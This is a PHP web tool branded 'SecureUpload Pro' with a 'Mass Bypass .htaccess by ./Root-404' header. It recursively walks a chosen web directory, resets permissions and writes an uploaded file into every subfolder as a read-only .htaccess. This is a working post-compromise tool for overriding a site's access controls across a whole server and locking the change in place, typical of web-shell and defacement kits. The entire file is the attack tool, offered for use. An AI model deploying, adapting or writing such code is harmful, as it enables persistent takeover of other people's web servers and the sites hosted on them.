<?php
$successLog = [];
$errorLog = [];
$totalFolders = 0;
$showResults = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file']) && isset($_POST['target_path'])) {
    $showResults = true;
    $targetPath = rtrim($_POST['target_path'], '/');

    if (!is_dir($targetPath)) {
        $errorLog[] = "❌ Target directory not found: <code>$targetPath</code>";
    } else {
        $tmpFile = $_FILES['file']['tmp_name'];
        $originalName = basename($_FILES['file']['name']);
        $fileContent = file_get_contents($tmpFile);

        function processFolder($dir, $originalName, $fileContent, &$successLog, &$errorLog, &$totalFolders) {
            $items = scandir($dir);
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                $path = $dir . '/' . $item;

                if (is_dir($path)) {
                    $totalFolders++;
                    
                    // Step 1: Set folder permissions to 0755
                    if (@chmod($path, 0755)) {
                        $successLog[] = "🔧 Folder chmod 0755: <code>$path</code>";
                    } else {
                        $errorLog[] = "⚠️ Failed to chmod folder: <code>$path</code>";
                    }

                    // Set permissions for all files in folder to 0644 (except .htaccess)
                    $innerItems = scandir($path);
                    foreach ($innerItems as $inner) {
                        if ($inner === '.' || $inner === '..') continue;
                        $innerPath = $path . '/' . $inner;
                        if (is_file($innerPath) && basename($innerPath) !== '.htaccess') {
                            if (@chmod($innerPath, 0644)) {
                                $successLog[] = "📝 File chmod 0644: <code>$innerPath</code>";
                            } else {
                                $errorLog[] = "⚠️ Failed to chmod file: <code>$innerPath</code>";
                            }
                        }
                    }

                    // Step 2: Upload file to directory
                    $uploadFile = $path . '/' . $originalName;
                    if (@file_put_contents($uploadFile, $fileContent) === false) {
                        $errorLog[] = "❌ Failed to upload to: <code>$uploadFile</code>";
                    } else {
                        // Set uploaded file permissions to 0644
                        if (@chmod($uploadFile, 0644)) {
                            $successLog[] = "📁 File uploaded: <code>$uploadFile</code> (chmod 0644)";
                        } else {
                            $errorLog[] = "⚠️ Failed to chmod uploaded file: <code>$uploadFile</code>";
                        }

                        // Step 3: Rename to .htaccess
                        $htaccess = $path . '/.htaccess';
                        if (@rename($uploadFile, $htaccess)) {
                            $successLog[] = "✅ Renamed to .htaccess: <code>$htaccess</code>";

                            // Set .htaccess permissions to 0444 (read-only)
                            if (@chmod($htaccess, 0444)) {
                                $successLog[] = "🔒 .htaccess secured (chmod 0444): <code>$htaccess</code>";
                            } else {
                                $errorLog[] = "⚠️ Failed to secure .htaccess: <code>$htaccess</code>";
                            }
                        } else {
                            $errorLog[] = "❌ Failed to rename: <code>$uploadFile</code> → <code>$htaccess</code>";
                        }
                    }

                    // Recursive processing
                    processFolder($path, $originalName, $fileContent, $successLog, $errorLog, $totalFolders);
                }
            }
        }

        processFolder($targetPath, $originalName, $fileContent, $successLog, $errorLog, $totalFolders);
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecureUpload Pro - Mass File Deployment System</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%);
            color: #e0e0e0;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px 0;
            border-bottom: 2px solid #00ff88;
        }

        .header h1 {
            font-size: 2.5rem;
            color: #00ff88;
            margin-bottom: 10px;
            text-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
        }

        .header p {
            color: #b0b0b0;
            font-size: 1.1rem;
        }

        .upload-section {
            background: rgba(30, 30, 45, 0.9);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(0, 255, 136, 0.2);
        }

        .form-group {
            margin-bottom: 25px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #00ff88;
            font-weight: 600;
            font-size: 1.1rem;
        }

        .form-group input[type="text"] {
            width: 100%;
            padding: 15px;
            background: rgba(20, 20, 30, 0.8);
            border: 2px solid rgba(0, 255, 136, 0.3);
            border-radius: 8px;
            color: #e0e0e0;
            font-size: 1rem;
            transition: all 0.3s ease;
        }

        .form-group input[type="text"]:focus {
            outline: none;
            border-color: #00ff88;
            box-shadow: 0 0 15px rgba(0, 255, 136, 0.2);
        }

        .file-upload-area {
            border: 3px dashed rgba(0, 255, 136, 0.4);
            border-radius: 12px;
            padding: 40px;
            text-align: center;
            background: rgba(20, 20, 30, 0.5);
            transition: all 0.3s ease;
            cursor: pointer;
        }

        .file-upload-area:hover {
            border-color: #00ff88;
            background: rgba(0, 255, 136, 0.05);
        }

        .file-upload-area.dragover {
            border-color: #00ff88;
            background: rgba(0, 255, 136, 0.1);
            transform: scale(1.02);
        }

        .file-upload-area input[type="file"] {
            display: none;
        }

        .upload-icon {
            font-size: 3rem;
            color: #00ff88;
            margin-bottom: 15px;
        }

        .upload-text {
            font-size: 1.2rem;
            margin-bottom: 10px;
        }

        .upload-subtext {
            color: #b0b0b0;
            font-size: 0.9rem;
        }

        .selected-file {
            margin-top: 15px;
            padding: 10px;
            background: rgba(0, 255, 136, 0.1);
            border-radius: 6px;
            color: #00ff88;
        }

        .upload-btn {
            background: linear-gradient(45deg, #00ff88, #00e5ff);
            color: #000;
            border: none;
            padding: 15px 40px;
            font-size: 1.1rem;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            margin-top: 20px;
        }

        .upload-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0, 255, 136, 0.3);
        }

        .upload-btn:disabled {
            background: #444;
            color: #888;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: rgba(30, 30, 45, 0.9);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            border: 1px solid rgba(0, 255, 136, 0.2);
        }

        .stat-number {
            font-size: 2rem;
            font-weight: bold;
            color: #00ff88;
        }

        .stat-label {
            color: #b0b0b0;
            margin-top: 5px;
        }

        .logs-section {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-top: 30px;
            animation: slideUp 0.5s ease-out;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .log-box {
            background: rgba(20, 20, 30, 0.9);
            border-radius: 12px;
            padding: 20px;
            max-height: 500px;
            overflow-y: auto;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .log-box.success {
            border-left: 5px solid #00ff88;
        }

        .log-box.error {
            border-left: 5px solid #ff4444;
        }

        .log-title {
            font-size: 1.2rem;
            font-weight: bold;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .log-title.success {
            color: #00ff88;
        }

        .log-title.error {
            color: #ff4444;
        }

        .log-entry {
            padding: 8px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            line-height: 1.4;
            animation: fadeIn 0.3s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .log-entry:last-child {
            border-bottom: none;
        }

        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 25px;
            border-radius: 8px;
            color: white;
            font-weight: bold;
            z-index: 1000;
            transform: translateX(400px);
            transition: transform 0.3s ease;
        }

        .notification.show {
            transform: translateX(0);
        }

        .notification.success {
            background: linear-gradient(45deg, #00ff88, #00cc6a);
        }

        .notification.error {
            background: linear-gradient(45deg, #ff4444, #cc0000);
        }

        .notification.info {
            background: linear-gradient(45deg, #00e5ff, #0099cc);
        }

        .reset-btn {
            background: rgba(255, 68, 68, 0.8);
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 0.9rem;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 20px;
        }

        .reset-btn:hover {
            background: rgba(255, 68, 68, 1);
            transform: translateY(-1px);
        }

        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }

            .header h1 {
                font-size: 2rem;
            }

            .upload-section {
                padding: 20px;
            }

            .logs-section {
                grid-template-columns: 1fr;
            }

            .file-upload-area {
                padding: 30px 20px;
            }

            .upload-icon {
                font-size: 2rem;
            }
        }

        code {
            background: rgba(0, 255, 136, 0.1);
            padding: 2px 6px;
            border-radius: 3px;
            color: #00ff88;
        }

        .processing-indicator {
            display: none;
            text-align: center;
            padding: 20px;
            color: #00ff88;
            font-size: 1.1rem;
        }

        .processing-indicator.show {
            display: block;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Bypass .htacces</h1>
            <p>Mass Bypass .htacess by ./Root-404</p>
        </div>

        <div class="upload-section">
            <form id="uploadForm" method="POST" enctype="multipart/form-data">
                <div class="form-group">
                    <label for="targetPath">🎯 Target Directory Path</label>
                    <input type="text" id="targetPath" name="target_path" 
                           placeholder="/home/user/public_html" 
                           value="<?php echo isset($_POST['target_path']) ? htmlspecialchars($_POST['target_path']) : ''; ?>" 
                           required>
                </div>

                <div class="form-group">
                    <label>📁 Select File for Mass Upload</label>
                    <div class="file-upload-area" id="fileUploadArea">
                        <div class="upload-icon">📤</div>
                        <div class="upload-text">Click to select file or drag & drop</div>
                        <div class="upload-subtext">Supports all file types for security deployment</div>
                        <input type="file" id="fileInput" name="file" required>
                        <div class="selected-file" id="selectedFile" style="display: none;"></div>
                    </div>
                </div>

                <button type="submit" class="upload-btn" id="uploadBtn">
                    🚀 Mass Bypass .htaccess Files
                </button>

                <?php if ($showResults): ?>
                    <button type="button" class="reset-btn" onclick="window.location.href='<?php echo $_SERVER['PHP_SELF']; ?>'">
                        🔄 New Upload
                    </button>
                <?php endif; ?>
            </form>

            <div class="processing-indicator" id="processingIndicator">
                🔄 Processing files and setting permissions...
            </div>
        </div>

        <?php if ($showResults): ?>
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-number"><?php echo count($successLog); ?></div>
                    <div class="stat-label">Successful Operations</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number"><?php echo count($errorLog); ?></div>
                    <div class="stat-label">Failed Operations</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number"><?php echo $totalFolders; ?></div>
                    <div class="stat-label">Folders Processed</div>
                </div>
            </div>

            <div class="logs-section">
                <div class="log-box success">
                    <div class="log-title success">
                        ✅ Success Log (<?php echo count($successLog); ?> entries)
                    </div>
                    <?php if (!empty($successLog)): ?>
                        <?php foreach ($successLog as $entry): ?>
                            <div class="log-entry"><?php echo $entry; ?></div>
                        <?php endforeach; ?>
                    <?php else: ?>
                        <div class="log-entry">No successful operations recorded.</div>
                    <?php endif; ?>
                </div>

                <div class="log-box error">
                    <div class="log-title error">
                        ❌ Error Log (<?php echo count($errorLog); ?> entries)
                    </div>
                    <?php if (!empty($errorLog)): ?>
                        <?php foreach ($errorLog as $entry): ?>
                            <div class="log-entry"><?php echo $entry; ?></div>
                        <?php endforeach; ?>
                    <?php else: ?>
                        <div class="log-entry">No errors encountered.</div>
                    <?php endif; ?>
                </div>
            </div>
        <?php endif; ?>
    </div>

    <script>
        // File upload handling
        const fileUploadArea = document.getElementById('fileUploadArea');
        const fileInput = document.getElementById('fileInput');
        const selectedFile = document.getElementById('selectedFile');
        const uploadForm = document.getElementById('uploadForm');
        const uploadBtn = document.getElementById('uploadBtn');
        const processingIndicator = document.getElementById('processingIndicator');

        // Drag and drop functionality
        fileUploadArea.addEventListener('click', () => fileInput.click());
        
        fileUploadArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            fileUploadArea.classList.add('dragover');
        });

        fileUploadArea.addEventListener('dragleave', () => {
            fileUploadArea.classList.remove('dragover');
        });

        fileUploadArea.addEventListener('drop', (e) => {
            e.preventDefault();
            fileUploadArea.classList.remove('dragover');
            const files = e.dataTransfer.files;
            if (files.length > 0) {
                fileInput.files = files;
                showSelectedFile(files[0]);
            }
        });

        fileInput.addEventListener('change', (e) => {
            if (e.target.files.length > 0) {
                showSelectedFile(e.target.files[0]);
            }
        });

        function showSelectedFile(file) {
            selectedFile.style.display = 'block';
            selectedFile.innerHTML = `
                <strong>Selected:</strong> ${file.name} 
                <span style="color: #b0b0b0;">(${formatFileSize(file.size)})</span>
            `;
        }

        function formatFileSize(bytes) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        // Form submission with processing indicator
        uploadForm.addEventListener('submit', (e) => {
            if (!fileInput.files[0]) {
                e.preventDefault();
                showNotification('Please select a file first!', 'error');
                return;
            }

            uploadBtn.disabled = true;
            uploadBtn.textContent = '🔄 Processing...';
            processingIndicator.classList.add('show');
            
            // Show processing notification
            showNotification('Starting file deployment process...', 'info');
        });

        function showNotification(message, type) {
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            notification.textContent = message;
            document.body.appendChild(notification);

            setTimeout(() => notification.classList.add('show'), 100);
            setTimeout(() => {
                notification.classList.remove('show');
                setTimeout(() => {
                    if (document.body.contains(notification)) {
                        document.body.removeChild(notification);
                    }
                }, 300);
            }, 4000);
        }

        // Initialize notifications
        <?php if ($showResults): ?>
            <?php if (count($successLog) > 0 && count($errorLog) == 0): ?>
                showNotification('✅ All operations completed successfully!', 'success');
            <?php elseif (count($errorLog) > 0 && count($successLog) > 0): ?>
                showNotification('⚠️ Deployment completed with some errors', 'error');
            <?php elseif (count($errorLog) > 0): ?>
                showNotification('❌ Deployment failed with errors', 'error');
            <?php endif; ?>
        <?php else: ?>
            showNotification('🛡️ SecureUpload Pro ready for deployment', 'info');
        <?php endif; ?>

        // Auto-scroll to results if they exist
        <?php if ($showResults): ?>
            setTimeout(() => {
                const logsSection = document.querySelector('.logs-section');
                if (logsSection) {
                    logsSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
                }
            }, 500);
        <?php endif; ?>
    </script>
</body>
</html>